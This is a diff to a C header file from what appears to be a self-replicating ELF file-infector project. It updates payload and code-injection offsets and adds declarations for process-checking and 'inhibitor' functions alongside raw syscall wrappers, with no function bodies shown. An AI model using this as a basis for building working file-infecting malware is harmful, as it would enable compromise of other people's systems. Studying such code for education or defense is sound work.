@@ -19,13 +19,13 @@
 # define BUF_SIZE 0x20
 # define END_SIZE 0x5B
 # define LOADER_SIZE 0x7C
-# define PAYLOAD_SIZE 0x2356 - FT_MEMCPY_ADDR + 0x7
-# define MAIN_OFFSET 0x22e6 - FT_MEMCPY_ADDR
+# define PAYLOAD_SIZE 0x2679 - FT_MEMCPY_ADDR + 0x7
+# define MAIN_OFFSET 0x25df - FT_MEMCPY_ADDR
 # define INJECT_SIZE LOADER_SIZE + END_SIZE + SIGN_SIZE + 4
 
-# define OFFSET_1 0x1b4a - FT_MEMCPY_ADDR
-# define OFFSET_2 0x1c6f - FT_MEMCPY_ADDR
-# define OFFSET_3 0x1d94 - FT_MEMCPY_ADDR
+# define OFFSET_1 0x1e43 - FT_MEMCPY_ADDR
+# define OFFSET_2 0x1f68 - FT_MEMCPY_ADDR
+# define OFFSET_3 0x208d - FT_MEMCPY_ADDR
 
 typedef struct		s_info
 {
@@ -64,14 +64,17 @@ void		write_begin(char *buf);
 void		write_filename_src(char *buf);
 void		write_test(char *buf);
 void		write_test2(char *buf);
-
 void		write_sign(char *buf);
+void		write_proc(char *buf);
+void		write_inhibitor(char *buf);
+void		write_stat(char *buf);
 
 /*			**** PARSING ****					*/
 int			find_text(t_info *info);
 void		epo_parsing(t_info *info);
 void		pe_parsing(t_info *info);
 void		patch_end(t_info *info, int32_t nb);
+int			check_process(char *buf_path);
 
 /*			**** LIB HANDLERS	****			*/
 void		ft_memcpy(void *dest, void *src, size_t size);
@@ -84,6 +87,9 @@ void		*ft_sysmmap(void *addr, size_t length, int prot, int flags, int fd, off_t 
 void		*ft_sysmunmap(void *addr, size_t len);
 int			ft_sysfstat(int fd, struct stat *buf); 
 int			ft_sysgetdents(unsigned int fd, char *buf, unsigned int count);
+ssize_t		ft_sysread(int fd, void *buf, size_t count);
+int			ft_strncmp(const char *s1, const char *s2, int n);
+int			ft_strlen(const char *s);
 void		handle_exit(void *addr);
 
 #endif
